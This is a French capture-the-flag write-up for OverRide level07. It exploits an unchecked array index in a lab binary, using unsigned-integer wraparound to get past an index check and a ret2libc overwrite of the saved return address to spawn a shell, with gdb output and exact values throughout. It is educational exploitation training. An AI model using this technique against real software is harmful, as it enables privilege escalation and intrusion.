## Level07

On observe que le binaire nous permet de stocker un nombre a un certain index, et d'afficher le contenu du tableau pour un index donné.

Lorsque qu'on entre un index qui est divisible par 3, nous obtenons un message d'erreur:

![image](https://user-images.githubusercontent.com/29956389/95601346-9bf4b100-0a53-11eb-8b10-d557af6084f4.png)

Le binaire éfface les argument passé, ainsi que l'environement, mais nous laisse avec une stack executable.

```
while (av[i] != 0)
{
	memset(av[i], 0, strlen(av[i]));
	i++;
}
i = 0;
while (env[i] != 0)
{
	memset(env[i], 0, strlen(env[i]));
	i++;
}
```

Une fois le code désassemblé, on observe que le tableau qui stocke les nombres a 100 index: `char	database[100];`, mais aucune vérification est faite sur l'index que nous donnons, nous pouvons donc en theorie écrire ou nous voulons.

On peut donc en theorie réécrire l'eip pour qu'il pointe sur du shellcode stocké dans le tableau.

Avec la structure du code, on tente donc de trouver l'eip stocké lors de l'appel a main:

```
level07@OverRide:~$ gdb -q ./level07 
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) b *main
Breakpoint 1 at 0x8048723
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048723 in main ()
(gdb) i f
Stack level 0, frame at 0xffffd710:
 eip = 0x8048723 in main; saved eip 0xf7e45513
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd710
 Saved registers:
  eip at 0xffffd70c   <--- EIP
```

Maintenant il faut trouver l'adresse du tableau pour en dériver l'index que nous utiliserons pour réécrire l'eip:

Pour cela on peut directement afficher l'adresse `[esp+0x24]` a `main+110`, le problème est que gdb modifie les variables d'environement, ce qui entraine une variation dans les adresses de la stack. On aura donc bien du mal a trouver l'adresse lorsque nous somme pas dans GDB.

La solution ici, est d'utiliser la fonction `read_number` pour trouver la différence relative entre l'adresse effective du tableau, et l'adresse du tableau passé en argument a la fonction `read_number`: Cette différence ne changera pas lors d'ajout ou de retrait de variable d'environement.

Lors de l'appel a `read_number`, le tableau sera stocké a `ebp+0x8`: EBP est le debut de notre stackframe, `ebp+0x4` est l'eip enregistré, et `ebp+0x8` est le tableau logiquement.

```
(gdb) b *read_number+6
(gdb) r
[...]
(gdb) x $ebp+0x8
0xffffd520:     0xffffd544
```

`0xffffd520` est l'adresse pour l'argument de la fonction, et `0xffffd544` est l'adresse réélle du tableau.

```
(gdb) p 0xffffd544 - 0xffffd520
$2 = 36
(gdb) p 36 / 4  <-- 4 parce que tableau de int
$3 = 9
```

On obtiens l'index 9. `9 % 3 == 0` il faut donc contourner cette protection. Si nous prenons `-9`, on fait passer l'unsigned int a 4294956356 soit 0xFFFFD544: notre tableau.

Calculons maintenant l'offset entre le tableau et l'eip enregistré:

```
=> eip at 0xffffd70c
=> database is at 0xffffd544
[...]
(gdb) p 0xffffd70c - 0xffffd544
456
(gdb) p 456 / 4  <--- to int
114
```

L'offset est de 114, vérifions:

```
Breakpoint 1, 0x080486dd in read_number ()
(gdb) c
Continuing.
 Index: 114
 Number at data[114] is 4158936339  <-- eip ?
 Completed read command successfully
(gdb) p/x 4158936339
$10 = 0xf7e45513
(gdb) x 0xf7e45513
0xf7e45513 <__libc_start_main+243>:     0xe8240489
```

Problème: 114 est divisable par 3.

On obseve ceci a la fin de la fonction `store_number`:

```
// index = index << 2; 
// <+149>:   shl    eax,0x2
database[index << 2] = nbr;
```

Ce qui equivaut a multiplier l'index donné par 4, ceci nous permet de faire wrapper l'unsigned int et d'inserer une valeur a l'index 114:

On prend donc `(UINT_MAX / 4) + 114` soit  `4294967296 / 4 + 114` = `1,073,741,938`

Essayons:

```
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
[...]

Input command: store
 Number: 3735928559	(0xdeadbeef)
 Index: 1073741938	(0xffffd70c)
 Completed store command successfully
Input command: quit

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()	<-- Nice
```

Stocker tout un shellcode dans un tableau qui bloque chaque troisème entrée est possible, mais long et fastidieux, car il faudrait entre chque instruction une par une, et calculer l'overflow de l'unsigned int pour contourner la protection.

Utilisons donc plutot une attaque ret2libc:
  - On sait que l'eip `0xffffd70c` est stocké a l'index+114 soit `1073741938`, c'est la qu'on écrira l'adresse du syscall `system`.
  - L'index + 115 est l'adresse retour, on peut y mettre l'adresse d'exit si on souhaite quitter le programme proprement.
  - L'index + 116 doit contenir notre string `/bin/sh`
  
Localisons ces addresses:

```
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system	<-- Ici
0xf7f48a50  svcerr_systemerr
(gdb) p 0xf7e6aed0
$11 = 4159090384	<-- En décimal pour le stockage

(gdb) info proc map
process 8082
Mapped address spaces:
[...]
Start Addr   End Addr       Size     Offset objfile
[...]
    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
    0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
    0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
    0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec		<-- ici
1 pattern found.
(gdb) p 0xf7f897ec
$12 = 4160264172	<-- en décimal
```

Ce qui nous donne:

```
evel07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
[...]

Input command: store
 Number: 4159090384	<--- system()
 Index: 1073741938	<--- EIP
 Completed store command successfully
Input command: store
 Number: 4160264172	<--- "/bin/sh"
 Index: 116		<-- System(114) + ret_addr(115) + "/bin/sh"(116)
 Completed store command successfully
```

Et maintenant il ne reste plus qu'a pop l'eip enrégistré en quittant le main:

```
[...]
Input command: quit
$ whoami
level08
$ 
```



